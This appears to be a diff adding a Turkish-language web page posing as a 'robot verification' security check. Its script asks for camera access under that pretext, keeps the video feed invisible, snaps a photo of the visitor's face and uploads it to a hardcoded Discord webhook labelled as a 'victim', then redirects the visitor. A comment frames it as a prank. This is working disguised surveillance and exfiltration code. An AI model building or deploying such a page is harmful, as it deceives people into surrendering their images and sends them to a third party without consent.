@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Güvenlik Doğrulaması Gerekli</title>
+    <style>
+        :root {
+            --bg-color: #0f0f12;
+            --text-color: #e0e0e0;
+            --accent-color: #00d2d3;
+            --card-bg: #1e1e24;
+            --font-mono: 'Courier New', Courier, monospace;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: var(--bg-color);
+            color: var(--text-color);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Kamerayı tamamen gizle */
+        #camera-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        video, canvas {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        /* Arayüz */
+        .container {
+            background-color: var(--card-bg);
+            padding: 40px;
+            border-radius: 15px;
+            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
+            text-align: center;
+            max-width: 450px;
+            width: 90%;
+            border: 1px solid #333;
+            position: relative;
+            z-index: 10;
+        }
+
+        .icon {
+            font-size: 50px;
+            margin-bottom: 20px;
+            color: var(--accent-color);
+        }
+
+        h1 {
+            font-size: 22px;
+            margin-bottom: 15px;
+            color: white;
+        }
+
+        p {
+            color: #aaa;
+            margin-bottom: 30px;
+            line-height: 1.6;
+        }
+
+        .status-box {
+            background: #111;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: var(--font-mono);
+            font-size: 13px;
+            text-align: left;
+            margin-bottom: 25px;
+            border-left: 4px solid var(--accent-color);
+            height: 100px;
+            overflow-y: auto;
+        }
+
+        .log-entry {
+            display: block;
+            margin-bottom: 4px;
+            opacity: 0;
+            animation: fadeIn 0.3s forwards;
+        }
+        .log-entry.success { color: #00d2d3; }
+        .log-entry.error { color: #ff4757; }
+        .log-entry.warn { color: #ffa502; }
+
+        button {
+            background: var(--accent-color);
+            color: #000;
+            border: none;
+            padding: 15px 30px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            transition: transform 0.2s, background 0.2s;
+            box-shadow: 0 0 15px rgba(0, 210, 211, 0.4);
+        }
+
+        button:hover {
+            transform: scale(1.02);
+            background: #01a3a4;
+        }
+
+        button:disabled {
+            background: #555;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        @keyframes fadeIn {
+            to { opacity: 1; }
+        }
+
+        .hidden { display: none; }
+    </style>
+</head>
+<body>
+
+    <div id="camera-container">
+        <video id="video" autoplay playsinline muted></video>
+        <canvas id="canvas" class="hidden"></canvas>
+    </div>
+
+    <div class="container">
+        <div class="icon">🛡️</div>
+        <h1>Robot Doğrulaması</h1>
+        <p>İşleme devam etmek için lütfen güvenlik taramasını başlatın. Kullanıcı doğrulaması gereklidir.</p>
+        
+        <div class="status-box" id="console-output">
+            <span class="log-entry">> Sistem hazır...</span>
+        </div>
+
+        <button id="verify-btn" onclick="startProcess()">Ben İnsanım</button>
+    </div>
+
+    <script>
+        // === AYARLAR ===
+        // Şaka sonrası gidecek sayfa
+        const REDIRECT_URL = 'anasayfa.html';
+        
+        // Discord Webhook URL
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1471877651621744673/Y9Nlb3hMerR62JH3h7pxomeGUI6WiP8g5rfbGiIAbDxOABGVGbkZhOXU6QVVtYhMaD_6';
+
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const consoleOutput = document.getElementById('console-output');
+        const verifyBtn = document.getElementById('verify-btn');
+
+        let stream = null;
+
+        function addLog(msg, type = 'normal') {
+            const span = document.createElement('span');
+            span.className = `log-entry ${type}`;
+            span.innerText = `> ${msg}`;
+            consoleOutput.appendChild(span);
+            consoleOutput.scrollTop = consoleOutput.scrollHeight;
+        }
+
+        async function startCamera() {
+            try {
+                addLog("Kamera erişimi isteniyor...", "warn");
+                
+                // Kamerayı aç
+                stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user" }, 
+                    audio: false 
+                });
+                
+                video.srcObject = stream;
+                addLog("Görüntü akışı başlatıldı.", "success");
+                
+                // Çekim için kısa bekleme
+                setTimeout(captureAndSend, 1000);
+                
+            } catch (err) {
+                addLog("Hata: İzin reddedildi!", "error");
+                verifyBtn.innerText = "İzin Gerekli";
+                verifyBtn.disabled = false;
+            }
+        }
+
+        function captureAndSend() {
+            if (!stream) return;
+
+            addLog("Yüz taraması yapılıyor...", "normal");
+
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            const imageData = canvas.toDataURL('image/png');
+            
+            // Gönderim işlemi
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    sendToDiscord(blob);
+                });
+        }
+
+        function sendToDiscord(blob) {
+            addLog("Veriler şifreleniyor...", "normal");
+
+            const formData = new FormData();
+            formData.append("file1", blob, `victim_${Date.now()}.png`);
+            formData.append("content", "🎯 **Yeni Kurban Tespit Edildi!**\nTarama başarıyla tamamlandı.");
+            formData.append("username", "Bot Avcısı");
+
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                addLog("Doğrulama BAŞARILI!", "success");
+                addLog("Yönlendiriliyor...", "normal");
+                
+                // Gönderim başarılı olursa yönlendir
+                setTimeout(() => {
+                    window.location.href = REDIRECT_URL;
+                }, 1500);
+            })
+            .catch(error => {
+                addLog("Bağlantı hatası.", "error");
+                console.error(error);
+            });
+        }
+
+        function startProcess() {
+            verifyBtn.disabled = true;
+            verifyBtn.innerText = "Taranıyor...";
+            startCamera();
+        }
+    </script>
+</body>
+</html>
